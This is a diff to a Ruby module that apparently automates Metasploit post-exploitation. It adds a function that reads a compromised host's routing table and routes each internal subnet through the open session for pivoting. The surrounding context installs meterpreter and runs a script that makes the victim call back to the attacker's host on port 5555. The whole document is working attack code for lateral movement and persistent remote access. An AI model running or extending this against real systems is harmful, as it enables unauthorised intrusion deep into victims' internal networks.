@@ -23,6 +23,7 @@ module Session
     thread = Thread.new do
       begin      
         session.load_stdapi
+        add_route_to_session session
         install_meterpreter session
       rescue ::Exception
         puts("problem in session_action: #{$!} #{$!.backtrace}")
@@ -38,6 +39,21 @@ module Session
     args = "-S -i 5 -p 5555 -r #{lhost}"
     puts "run: #{script_path} #{args}"
     session.execute_file(script_path, args)
+  end
+
+  def self.add_route_to_session session
+    sb = Rex::Socket::SwitchBoard.instance
+    session.net.config.each_route do |route|
+      # Remove multicast and loopback interfaces
+      next if route.subnet =~ /^(224\.|127\.)/
+      next if route.subnet == '0.0.0.0'
+      next if route.netmask == '255.255.255.255'
+      next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new session.target_host
+      unless sb.route_exists?(route.subnet, route.netmask)
+        puts "AutoAddRoute: Routing new subnet #{route.subnet}/#{route.netmask} through session #{session.sid}"
+        sb.add_route(route.subnet, route.netmask, session)
+      end
+    end
   end
 
 end end
